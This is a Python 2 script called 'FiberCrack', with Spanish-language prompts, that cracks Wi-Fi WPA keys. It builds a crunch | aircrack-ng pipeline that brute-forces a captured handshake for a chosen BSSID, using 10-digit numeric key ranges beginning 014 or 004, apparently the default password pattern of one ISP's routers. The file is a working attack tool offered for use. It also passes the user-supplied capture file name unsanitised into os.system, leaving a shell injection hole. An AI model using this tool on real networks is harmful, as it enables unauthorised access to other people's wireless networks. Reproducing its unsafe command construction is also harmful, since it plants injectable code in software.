#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Coded by: Ignacio Navarro
# Version: 1.1

import sys
import os
import re


class bcolors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'


def getComando(prefijo, sufijo, tipo):
    command = '014{}'
    if prefijo == 2:
        command = '004{}'
    if tipo == 'inicio':
        comret = command.format('1000000')
        if sufijo == 2:
            comret = command.format('2000000')
        elif sufijo == 3:
            comret = command.format('3000000')
        elif sufijo == 4:
            comret = command.format('4000000')
        return comret
    else:
        comret = command.format('2000000')
        if sufijo == 2:
            comret = command.format('3000000')
        elif sufijo == 3:
            comret = command.format('4000000')
        elif sufijo == 4:
            comret = command.format('5000000')
        return comret


def ascii():
    print bcolors.GREEN + "  _____ _ _                ____                _    " + bcolors.ENDC
    print bcolors.GREEN + " |  ___(_) |__   ___ _ __ / ___|_ __ __ _  ___| | __" + bcolors.ENDC
    print bcolors.GREEN + " | |_  | | '_ \ / _ \ '__| |   | '__/ _` |/ __| |/ /" + bcolors.ENDC
    print bcolors.GREEN + " |  _| | | |_) |  __/ |  | |___| | | (_| | (__|   < " + bcolors.ENDC
    print bcolors.GREEN + " |_|   |_|_.__/ \___|_|   \____|_|  \__,_|\___|_|\_\ " + bcolors.ENDC
    print bcolors.GREEN + "                                                    " + bcolors.ENDC + bcolors.HEADER + "1.1" + bcolors.ENDC
    print bcolors.RED + "[-] Coded by Ignacio Daniel Navarro(@ignavarro1) [-]\n" + bcolors.ENDC


ascii()
if (len(sys.argv) != 3):
    print bcolors.RED + '[!] Ingrese datos validos' + bcolors.ENDC
    print bcolors.GREEN + 'Ej: fibercrack.py ARCHIVO.CAP MAC' + bcolors.ENDC
else:
    file = sys.argv[1]
    mac = sys.argv[2]

    if ('.cap' not in file):
        print bcolors.RED + '[!] Ingrese archivo de captura valido' + bcolors.ENDC
        sys.exit()
    if not re.match('^([0-f][0-f][:-]){5}[0-f][0-f]$', mac):
        print bcolors.RED + '[!] Ingrese una direccion mac valida' + bcolors.ENDC
        sys.exit()

    print bcolors.GREEN + 'DATOS CORRECTOS' + bcolors.ENDC
    print bcolors.BLUE + '[?] Elija una opcion' + bcolors.ENDC
    print '1 - 014xxxxxxx'
    print '2 - 004xxxxxxx [Por defecto]'
    try:
        inicio = int(raw_input())
    except:
        inicio = 2
    if inicio not in [1, 2]:
        inicio = 2
    print bcolors.BLUE + '[?] Elija el digito de inicio' + bcolors.ENDC
    print '1 - xxx1000000'
    print '2 - xxx2000000'
    print '3 - xxx3000000 [Por defecto]'
    print '4 - xxx4000000'
    try:
        docinicio = int(raw_input())
    except:
        docinicio = 3
    if docinicio not in [1, 2, 3, 4]:
        docinicio = 3
    print bcolors.BLUE + '[?] Elija el digito de finalizacion' + bcolors.ENDC
    print '1 - xxx2000000'
    print '2 - xxx3000000'
    print '3 - xxx4000000 [Por defecto]'
    print '4 - xxx5000000'
    try:
        docfin = int(raw_input())
    except:
        docfin = 3
    if docfin not in [1, 2, 3, 4]:
        docfin = 3
    # En caso que sea final > inicio
    if docinicio > docfin:
        print bcolors.RED + '[!] Verifique los rangos de inicio y fin' + bcolors.ENDC
        sys.exit()
    desde = getComando(inicio, docinicio, 'inicio')
    hasta = getComando(inicio, docfin, 'fin')
    comando = 'crunch 10 10 0123456789 -s {} -e {} | aircrack-ng --bssid {} -w- {}'.format(desde, hasta, mac, file)
    os.system(comando)